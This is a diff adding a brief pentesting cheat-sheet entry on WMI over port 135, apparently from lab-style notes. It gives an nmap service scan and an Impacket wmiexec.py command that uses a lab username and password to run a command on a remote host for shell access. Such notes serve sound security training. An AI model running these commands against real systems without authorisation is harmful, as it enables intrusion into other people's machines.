@@ -1,0 +1,11 @@
+# 135 WMI
+
+Basic Commands
+```
+nmap -sV -sC -p 135 10.129.120.23
+```
+
+WMIExec.py (Gain shell access)
+```shell
+/usr/share/doc/python3-impacket/examples/wmiexec.py Cry0l1t3:"P455w0rD!"@10.129.201.248 "hostname"
+```
